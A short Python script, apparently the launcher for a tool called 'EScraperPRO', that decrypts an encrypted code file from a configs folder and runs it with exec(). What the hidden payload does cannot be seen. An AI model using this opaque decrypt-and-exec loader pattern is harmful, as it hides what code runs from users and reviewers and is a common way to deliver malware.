import os

from utils.config import decrypt_code, load_encrypted_code_from_file, load_key_from_file

utils_folder = os.path.join(os.path.dirname(__file__), 'configs')

key_loaded = load_key_from_file(utils_folder, 'secure.private')

encrypted_code_loaded = load_encrypted_code_from_file(utils_folder, 'EScraperPRO.private')

try:
    decrypted_code = decrypt_code(encrypted_code_loaded, key_loaded)
    exec(decrypted_code)
except Exception as e:
    print(f"Decryption failed: {e}")
